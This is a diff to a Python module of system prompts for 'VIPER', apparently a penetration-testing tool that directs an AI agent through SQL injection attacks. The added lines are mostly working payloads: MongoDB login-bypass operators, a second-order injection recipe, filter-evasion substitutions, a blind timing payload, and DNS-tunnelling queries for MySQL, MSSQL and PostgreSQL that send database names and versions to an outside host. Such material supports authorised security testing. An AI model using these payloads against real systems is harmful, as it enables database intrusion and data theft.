@@ -1,9 +1,10 @@
 #!/usr/bin/env python3
 """
-VIPER 4.0 SQL Injection Attack Skill Prompts
+VIPER 5.0 SQL Injection Attack Skill Prompts
 
 System prompt and phase guidance for SQL injection testing.
-Ported from RedAmon's 7-step SQLi workflow with VIPER-native tool conventions.
+7-step SQLi workflow with VIPER-native tool conventions,
+OOB DNS exfiltration, NoSQL injection, and second-order SQLi.
 """
 
 
@@ -328,6 +329,45 @@ admin'/*
 | `space2hash` | Space to `#` + newline | MySQL WAF |
 | `space2mssqlblank` | MSSQL alt whitespace | MSSQL WAF |
 | `versionedkeywords` | MySQL versioned comments | MySQL WAF |
+
+### NoSQL Injection (MongoDB)
+```json
+{"username": {"$ne": ""}, "password": {"$ne": ""}}
+{"username": {"$gt": ""}, "password": {"$gt": ""}}
+{"username": {"$regex": "^admin"}, "password": {"$ne": ""}}
+{"username": "admin", "password": {"$regex": ".*"}}
+```
+
+### Second-Order SQLi
+Register with payload as username (e.g., `admin'--`), then trigger on login
+or profile display where the stored value is used unsanitized in a new query.
+
+### Syntax Alternatives for WAF Bypass
+```
+AND  -> &&  or  %26%26
+OR   -> ||  or  %7c%7c
+Space -> /**/ or %0a or %09 or +
+=    -> LIKE or REGEXP or RLIKE
+SELECT -> /*!50000SELECT*/ (MySQL version comment)
+Quotes -> Hex strings or CHAR()
+```
+
+### BENCHMARK-Based Blind (MySQL)
+When SLEEP is blocked:
+```sql
+' AND BENCHMARK(10000000,SHA1('test'))--
+```
+
+### DNS Tunneling for Data Exfiltration
+Encode query results as DNS subdomain labels for stealthy exfiltration:
+```sql
+-- MySQL (Windows): exfil via UNC/DNS
+' AND LOAD_FILE(CONCAT('\\\\\\\\',version(),'.DOMAIN\\\\a'))--
+-- MSSQL: xp_dirtree DNS lookup
+'; DECLARE @d VARCHAR(99); SET @d=CONVERT(VARCHAR(99),DB_NAME()); EXEC master..xp_dirtree '\\\\'+@d+'.DOMAIN\\a'--
+-- PostgreSQL: dblink DNS
+'; SELECT dblink_connect('host='||current_database()||'.DOMAIN')--
+```
 
 ### Error-Based Extraction (by DBMS)
 - **MySQL**: `' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))--`
